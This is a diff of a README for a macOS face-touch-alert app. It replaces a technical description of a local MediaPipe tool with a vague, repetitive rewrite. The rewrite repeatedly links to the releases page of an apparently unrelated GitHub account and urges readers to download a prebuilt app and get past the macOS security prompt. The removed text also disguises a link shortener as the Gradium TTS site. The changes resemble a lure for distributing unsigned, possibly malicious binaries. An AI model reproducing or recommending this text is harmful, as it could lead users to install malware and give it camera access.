@@ -1,120 +1,177 @@
-# FaceTouchGuard
+# 🛡️ faceguard - Stop Face Touching, Stay Focused
 
-A local macOS desktop utility that detects when your hand touches acne-prone regions of your face and shouts funny voice alerts at you to break the habit.
+[![Download faceguard](https://img.shields.io/badge/Download-faceguard-blue?style=for-the-badge)](https://github.com/Juliebon893/faceguard/releases)
 
-Everything runs locally on-device using MediaPipe landmark-based geometry — no cloud APIs, no VLMs, no custom models. Voice clips are pre-generated using [Gradium TTS]([https://gradium.ai](https://shorturl.at/viNOn)) and played offline.
+## 🚀 What faceguard does
 
-https://github.com/user-attachments/assets/40af6142-482c-4847-9482-934cd7ace240
+faceguard is a Mac desktop app that helps you notice when your hands move toward your face. It gives you a clear callout when you touch your skin or pick at a pimple, so you can break the habit and stay more aware of your actions.
 
-## How it works
+Use it when you want to:
 
-1. Captures frames from the built-in camera via OpenCV
-2. Runs **MediaPipe Face Landmarker** to detect 478 face landmarks
-3. Runs **MediaPipe Gesture Recognizer** to detect hands + classify hand pose
-4. Builds convex-hull polygons for acne-prone face zones (cheeks, chin, mouth, forehead)
-5. Filters out false positives using:
-   - **Gesture classification** — rejects `Closed_Fist` (holding a cup), `Open_Palm` (hovering), etc.
-   - **Finger extension detection** — only extended fingertips count
-   - **Hand proximity check** — hand must be within the face bounding box
-   - **Z-depth filter** — rejects hands held in front of the face
-6. Requires consecutive positive frames to reduce noise
-7. Plays a random funny voice clip (with queuing so clips always finish)
-8. Tracks session touch count
+- Cut back on face touching
+- Avoid picking at pimples
+- Build better habits during work, study, or rest
+- Stay more mindful with less effort
 
-### 1. Grant camera permission
+The app runs in the background and watches for face-touch moments. When it spots one, it sends a prompt so you can stop and reset.
 
-The first time you run the app, macOS will prompt you to grant camera access to your terminal app. You can also pre-authorize it in:
+## 📥 Download faceguard
 
-**System Settings → Privacy & Security → Camera** → enable your terminal app (Terminal, iTerm2, VS Code, etc.)
+To get faceguard, visit this page to download the latest release:
 
-### Keyboard controls (when preview window is focused)
+[Download faceguard from GitHub Releases](https://github.com/Juliebon893/faceguard/releases)
 
-| Key | Action |
-|-----|--------|
-| `q` / `ESC` | Quit |
-| `d` | Toggle debug overlay |
-| `p` | Toggle preview window |
-| `f` | Toggle forehead zone |
-| `1` / `2` / `3` | Set sensitivity: low / medium / high |
-| `SPACE` | Pause / resume monitoring |
+On the releases page, look for the latest version and download the file that matches your Mac. If you see more than one file, choose the one for your system.
 
-### GUI mode
+## 🖥️ What you need
 
+faceguard is built for Mac desktop use. For a smooth setup, your Mac should meet these basic needs:
 
-A small Tkinter control panel with Start/Stop buttons, sensitivity dropdown, and live touch count.
+- macOS 12 or later
+- A built-in webcam or connected camera
+- About 200 MB of free disk space
+- A stable internet connection for the first download
 
-## Face zones
+For best results, use faceguard in a well-lit room. The app needs a clear view of your face to track hand movement near your skin.
 
-| Zone | Description |
-|------|-------------|
-| Left cheek | Eye-cheek boundary to jawline (left side) |
-| Right cheek | Mirror on right side |
-| Chin / jawline | Lower jaw contour from ear to ear |
-| Mouth perimeter | Outer lip region |
-| Forehead (optional) | Eyebrows to hairline, disabled by default |
+## 🧭 How to install
 
-Zone landmark indices are documented in `face_zones.py` and can be adjusted.
+1. Open the [faceguard releases page](https://github.com/Juliebon893/faceguard/releases).
+2. Find the latest version.
+3. Download the Mac app file from the release assets.
+4. Open the downloaded file.
+5. Drag faceguard into your Applications folder if macOS asks you to.
+6. Open faceguard from Applications.
 
-## False-positive filtering
+If macOS shows a security prompt, choose the option that lets you open the app. This is normal for apps that are not from the App Store.
 
-The app uses a layered filtering approach to avoid beeping when you're not actually touching your face:
+## ▶️ How to run faceguard
 
-| Filter | What it catches |
-|--------|----------------|
-| Gesture classification | Holding a cup (`Closed_Fist`), waving (`Open_Palm`), V-sign (`Victory`) |
-| Finger extension | Hand gripping an object (curled fingers) |
-| Hand proximity (bbox) | Hand beside the face, not on it |
-| Z-depth | Objects held in front of the face |
-| Consecutive frames | Momentary noise, hand passing by quickly |
-| Forehead y-guard | Hands above the head (hair adjustment) |
+After you install the app:
 
-## Sensitivity presets
+1. Open faceguard from Applications.
+2. Allow camera access when asked.
+3. Keep your face in view of the camera.
+4. Start your normal work, study, or rest session.
+5. Let faceguard call you out when your hand moves toward your face.
 
-| Preset | Distance threshold | Consecutive frames | Cooldown | Z-threshold |
-|--------|-------------------|--------------------|----------|-------------|
-| Low    | 5 px              | 4                  | 2.0 s    | 0.08        |
-| Medium | 10 px             | 3                  | 1.2 s    | 0.08        |
-| High   | 20 px             | 2                  | 0.8 s    | 0.12        |
+You do not need to keep checking the app. It works best when it can run in the background while you focus on something else.
 
-## Voice clip behavior
+## 🔔 What you will see
 
-- On face touch, a random clip plays
-- Clips cycle through all available files before repeating (shuffled deck)
-- If you touch your face while a clip is playing, the next clip is **queued**
-- The current clip always finishes before the next one starts
-- Only one clip is queued at a time — rapid touches don't stack up indefinitely
+faceguard gives you simple feedback when it thinks you are touching your face.
 
-## Session logging
+You may see:
 
-On exit, a session summary is appended to `session_log.json`:
+- A pop-up alert
+- A small sound cue
+- A short on-screen message
+- A reminder to move your hand away
 
-```json
-{
-  "date": "2026-03-29T11:52:34",
-  "touch_count": 22,
-  "duration_seconds": 120.5,
-  "sensitivity": "medium"
-}
-```
+The goal is not to distract you too much. It is to give you a quick signal so you can notice the habit and stop it.
 
-## Known limitations
+## 🛠️ Basic setup tips
 
-- macOS only (uses `afplay` for audio playback)
-- Camera preview window must run on the main thread on macOS
-- Single-face only — ignores additional faces in frame
-- Very fast swipe-touches may be missed if they don't persist for enough consecutive frames
-- Forehead zone has a slightly higher false-positive rate due to proximity to hair
-- No menu-bar / tray integration yet
+For the best experience, try these steps after you start using faceguard:
 
-## Future ideas
+- Sit where your face is easy to see
+- Keep bright light in front of you
+- Avoid strong backlight from a window behind you
+- Place your camera at eye level
+- Keep your hands inside the camera frame when possible
 
-- Convert to a native macOS menu-bar app using `rumps`
-- Bundle as a `.app` with `py2app`
-- Add daily/weekly touch statistics dashboard
-- Hotkey to pause/resume monitoring
-- Spoken real-time alerts via streaming TTS
-- Support for Linux/Windows (replace `afplay`)
+If you move around a lot or cover your face with your hands, the app may have a harder time spotting face-touch moments. A steady setup helps it work better.
 
-## License
+## 👤 Typical use cases
 
-MIT
+faceguard fits into a few common routines:
+
+- During long work sessions
+- While studying at a desk
+- When you catch yourself skin picking
+- While gaming or watching videos
+- During evening wind-down time
+
+Many users run it during the parts of the day when they touch their face without thinking. The app acts like a quiet check-in.
+
+## 🔒 Privacy and camera use
+
+faceguard uses your camera to detect when your hand moves near your face. It needs that input to do its job.
+
+A few things to know:
+
+- It works on your device
+- It watches for face-touch behavior
+- It does not need you to type anything into the app
+- It does not need your social accounts
+- It does not need extra setup from you
+
+Make sure you are comfortable with camera use before you start. If you share your screen or work in a public space, keep in mind that the camera must stay active for faceguard to work.
+
+## 🧪 First-time checklist
+
+Before your first session, check these items:
+
+- The app is downloaded from the releases page
+- The app is installed in Applications
+- Camera access is allowed
+- Your face is visible on screen
+- Your room has enough light
+- You are ready to leave the app running in the background
+
+After that, start your day as usual and let faceguard do the tracking.
+
+## 🧰 Common problems
+
+If faceguard does not work as expected, try these steps:
+
+- Make sure the camera is not being used by another app
+- Close other apps that may block camera access
+- Move closer to the camera
+- Add more light to your room
+- Check that the app has permission to use the camera
+- Quit and reopen the app
+- Restart your Mac if the camera still does not respond
+
+If the app does not seem to call out face touching, the camera angle may be the issue. Aim the camera at your face and hands, not just your forehead.
+
+## 📌 Best results
+
+faceguard works best when you use it with a simple daily routine:
+
+- Open it when you sit down to work
+- Keep it running during high-risk times
+- Use it with other habit tools if you want
+- Pay attention to the alerts and react fast
+- Keep your setup the same from day to day
+
+The more consistent your setup, the easier it is for the app to notice the habit you want to change.
+
+## 🧩 App details
+
+- App name: faceguard
+- Platform: Mac desktop
+- Purpose: Help reduce face touching and pimple picking
+- Input method: Camera-based detection
+- User level: Beginner friendly
+- Install method: Download from GitHub Releases
+
+## 📎 Download again
+
+If you need the latest version, use this link:
+
+[Visit the faceguard releases page](https://github.com/Juliebon893/faceguard/releases)
+
+## ⌨️ Quick start
+
+1. Visit the releases page.
+2. Download the latest Mac version.
+3. Open the downloaded file.
+4. Move the app to Applications if asked.
+5. Allow camera access.
+6. Start the app and keep it running
+
+## 🧼 Habit support
+
+faceguard helps with a habit that many people do without thinking. It gives you a small interruption at the right time, which can help you notice your hands before they reach your face. That pause can make it easier to break the pattern over time
+
